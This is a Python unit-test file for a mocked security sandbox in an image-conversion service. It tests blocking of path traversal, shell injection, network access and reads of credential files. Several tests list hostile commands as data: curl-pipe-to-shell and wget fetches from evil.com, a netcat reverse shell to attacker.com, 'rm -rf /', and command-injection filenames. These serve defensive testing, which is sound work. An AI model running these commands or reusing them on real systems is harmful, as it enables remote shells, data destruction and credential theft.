"""Unit tests for the Security Sandbox module."""

import pytest
from unittest.mock import Mock, patch, MagicMock, call
import os
import subprocess
import tempfile
from pathlib import Path
import resource

# TODO: Uncomment when generators are properly imported
# from tests.fixtures.generators import SecurityTestGenerator
from unittest.mock import Mock


class TestSecuritySandbox:
    """Test suite for SecuritySandbox class."""

    @pytest.fixture
    def security_sandbox(self):
        """Create a SecuritySandbox instance for testing."""
        # TODO: Uncomment when SecuritySandbox is implemented
        # from app.core.security.sandbox import SecuritySandbox
        # return SecuritySandbox()

        # Mock for now
        mock_sandbox = Mock()
        mock_sandbox.max_memory_mb = 512
        mock_sandbox.max_cpu_percent = 80
        mock_sandbox.timeout_seconds = 300
        mock_sandbox.allowed_paths = []
        mock_sandbox.blocked_syscalls = []
        mock_sandbox.validate_path = Mock()
        mock_sandbox.validate_command = Mock(
            side_effect=lambda cmd: (
                None
                if "rm" not in str(cmd)
                else Mock(side_effect=SecurityError("Forbidden command"))
            )
        )
        mock_sandbox.execute_sandboxed = Mock(
            return_value={"output": b"success", "returncode": 0}
        )
        return mock_sandbox

    @pytest.fixture
    def malicious_payloads(self):
        """Get malicious test payloads."""
        # TODO: Use SecurityTestGenerator when imports are fixed
        # return SecurityTestGenerator()
        mock_generator = Mock()
        mock_generator.create_malicious_filename = Mock(
            return_value=[
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "image.jpg\x00.exe",
            ]
        )
        return mock_generator

    def test_sandbox_initialization(self, security_sandbox):
        """Test sandbox initializes with proper defaults."""
        # TODO: Enable when SecuritySandbox is implemented
        pytest.skip("Waiting for SecuritySandbox implementation")

        assert security_sandbox.max_memory_mb == 512
        assert security_sandbox.max_cpu_percent == 80
        assert security_sandbox.timeout_seconds == 300
        assert security_sandbox.allowed_paths is not None
        assert security_sandbox.blocked_syscalls is not None

    def test_sandbox_blocks_path_traversal(self, security_sandbox, malicious_payloads):
        """Test sandbox blocks path traversal attempts."""
        # Arrange
        malicious_filenames = malicious_payloads.create_malicious_filename()

        for filename in malicious_filenames:
            # Act & Assert
            with pytest.raises(SecurityError, match="Path traversal|Invalid path"):
                security_sandbox.validate_path(filename)

    def test_sandbox_allows_safe_paths(self, security_sandbox, temp_dir):
        """Test sandbox allows legitimate paths."""
        # Arrange
        safe_paths = [
            temp_dir / "image.jpg",
            temp_dir / "output" / "converted.webp",
            temp_dir / "temp_file.png",
        ]

        # Act & Assert
        for path in safe_paths:
            # Should not raise
            security_sandbox.validate_path(str(path))

    @patch("subprocess.Popen")
    def test_sandbox_enforces_resource_limits(self, mock_popen, security_sandbox):
        """Test sandbox enforces resource limits on subprocess."""
        # Arrange
        mock_process = Mock()
        mock_popen.return_value = mock_process
        mock_process.communicate.return_value = (b"output", b"")
        mock_process.returncode = 0

        # Act
        result = security_sandbox.execute_sandboxed(
            command=["convert", "input.jpg", "output.webp"], input_data=b"image_data"
        )

        # Assert
        mock_popen.assert_called_once()
        call_args = mock_popen.call_args

        # Verify resource limits are set
        assert call_args.kwargs.get("preexec_fn") is not None
        # The preexec_fn should set resource limits

    def test_sandbox_blocks_dangerous_commands(self, security_sandbox):
        """Test sandbox blocks dangerous shell commands."""
        # Arrange
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["curl", "evil.com/malware.sh", "|", "sh"],
            ["nc", "-e", "/bin/sh", "attacker.com", "4444"],
            ["wget", "http://evil.com/backdoor"],
            ["/bin/sh", "-c", "cat /etc/passwd"],
        ]

        # Act & Assert
        for cmd in dangerous_commands:
            with pytest.raises(
                SecurityError, match="Forbidden command|Security violation"
            ):
                security_sandbox.validate_command(cmd)

    def test_sandbox_timeout_enforcement(self, security_sandbox):
        """Test sandbox enforces execution timeout."""
        # Arrange
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            # Simulate timeout
            mock_process.communicate.side_effect = subprocess.TimeoutExpired(
                cmd=["convert"], timeout=300
            )

            # Act & Assert
            with pytest.raises(TimeoutError, match="Execution timeout"):
                security_sandbox.execute_sandboxed(
                    command=["convert", "large.tiff", "output.jpg"], timeout=5
                )

            # Verify process was killed
            mock_process.kill.assert_called_once()

    def test_sandbox_memory_limit_enforcement(self, security_sandbox):
        """Test sandbox enforces memory limits."""
        # Arrange
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            mock_process.communicate.return_value = (b"", b"Memory limit exceeded")
            mock_process.returncode = -9  # SIGKILL

            # Act & Assert
            with pytest.raises(MemoryError, match="Memory limit exceeded"):
                security_sandbox.execute_sandboxed(
                    command=["convert", "huge.jpg", "output.jpg"], max_memory_mb=100
                )

    def test_sandbox_network_isolation(self, security_sandbox):
        """Test sandbox blocks network access."""
        # Arrange
        network_commands = [
            ["curl", "http://example.com"],
            ["wget", "https://example.com"],
            ["ping", "8.8.8.8"],
            ["telnet", "example.com", "80"],
        ]

        # Act & Assert
        for cmd in network_commands:
            with pytest.raises(SecurityError, match="Network access|Forbidden"):
                security_sandbox.validate_command(cmd)

    def test_sandbox_filesystem_restrictions(self, security_sandbox, temp_dir):
        """Test sandbox filesystem access restrictions."""
        # Arrange
        restricted_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "~/.aws/credentials",
            "/proc/self/environ",
        ]

        # Act & Assert
        for path in restricted_paths:
            with pytest.raises(SecurityError, match="Access denied|Forbidden path"):
                security_sandbox.validate_file_access(path, mode="read")

    def test_sandbox_prevents_code_injection(
        self, security_sandbox, malicious_payloads
    ):
        """Test sandbox prevents code injection attempts."""
        # Arrange
        injection_attempts = [
            "image.jpg; cat /etc/passwd",
            "image.jpg && rm -rf /",
            "image.jpg | nc attacker.com 4444",
            "$(cat /etc/passwd)",
            "`whoami`",
            "image.jpg\n/bin/sh",
        ]

        # Act & Assert
        for payload in injection_attempts:
            with pytest.raises(SecurityError, match="Invalid|injection|forbidden"):
                security_sandbox.sanitize_filename(payload)

    def test_sandbox_environment_isolation(self, security_sandbox):
        """Test sandbox isolates environment variables."""
        # Arrange
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            mock_process.communicate.return_value = (b"output", b"")
            mock_process.returncode = 0

            # Act
            security_sandbox.execute_sandboxed(
                command=["convert", "input.jpg", "output.jpg"]
            )

            # Assert
            call_args = mock_popen.call_args
            env = call_args.kwargs.get("env", {})

            # Verify sensitive env vars are removed
            assert "AWS_SECRET_ACCESS_KEY" not in env
            assert "DATABASE_URL" not in env
            assert "API_KEY" not in env
            assert "PATH" in env  # But PATH should be minimal

    def test_sandbox_handles_zombie_processes(self, security_sandbox):
        """Test sandbox properly cleans up zombie processes."""
        # Arrange
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            mock_process.poll.return_value = None  # Still running

            # Simulate process becoming zombie
            mock_process.communicate.side_effect = Exception("Process died")

            # Act & Assert
            with pytest.raises(Exception):
                security_sandbox.execute_sandboxed(
                    command=["convert", "input.jpg", "output.jpg"]
                )

            # Verify cleanup attempted
            mock_process.kill.assert_called()

    @patch("os.setuid")
    @patch("os.setgid")
    def test_sandbox_drops_privileges(self, mock_setgid, mock_setuid, security_sandbox):
        """Test sandbox drops privileges when configured."""
        # Arrange
        security_sandbox.sandbox_uid = 1000
        security_sandbox.sandbox_gid = 1000

        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            mock_process.communicate.return_value = (b"output", b"")
            mock_process.returncode = 0

            # Act
            security_sandbox.execute_sandboxed(
                command=["convert", "input.jpg", "output.jpg"]
            )

            # Assert
            # Verify preexec_fn is set (which would drop privileges)
            call_args = mock_popen.call_args
            assert call_args.kwargs.get("preexec_fn") is not None

    def test_sandbox_validates_output_size(self, security_sandbox):
        """Test sandbox validates output doesn't exceed limits."""
        # Arrange
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            # Simulate very large output
            mock_process.communicate.return_value = (b"X" * (100 * 1024 * 1024), b"")
            mock_process.returncode = 0

            # Act & Assert
            with pytest.raises(ValueError, match="Output too large"):
                security_sandbox.execute_sandboxed(
                    command=["convert", "input.jpg", "output.jpg"],
                    max_output_size_mb=50,
                )
